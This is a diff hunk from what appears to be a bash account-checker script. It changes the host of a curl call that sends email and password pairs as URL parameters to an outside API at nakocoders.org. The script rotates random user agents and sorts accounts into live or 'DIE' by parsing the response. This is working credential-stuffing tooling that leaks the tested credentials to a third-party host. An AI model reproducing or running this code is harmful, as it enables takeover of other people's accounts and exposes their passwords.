@@ -38,7 +38,7 @@ printf "${GREEN}
 }
 tatsumi(){
     ua=$(cat ua.txt | sort -R | head -1)
-    curlnya=$(curl -s "http://api.nakocoders.org/api/phd/api.php?emailna=$1&passwordna=$2" -L)
+    curlnya=$(curl -s "http://48.nakocoders.org/api/phd/api.php?emailna=$1&passwordna=$2" -L)
     livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     kontenID=$(echo $curlnya | grep -Po '(?<=Point : )[^<span]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     if [[ ! $livena =~ "DIE" ]]; then
